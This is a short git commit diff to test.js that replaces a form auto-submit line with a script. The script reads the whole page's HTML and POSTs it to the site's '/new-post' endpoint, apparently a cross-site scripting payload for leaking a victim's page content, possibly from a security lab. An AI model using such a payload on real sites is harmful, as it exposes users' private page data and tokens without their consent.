96ca216c464f200c71d265bb79345aeef399023a
Guignolardinio <143706283+Guignolardinio@users.noreply.github.com>
2023-11-24 11:17:04 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,5 @@
-document.getElementById("ez2").submit();
+var post_data = 'title=TestTitle&text='+document.body.outerHTML;
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("POST", "/new-post", true);
+xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xmlhttp.send(post_data);
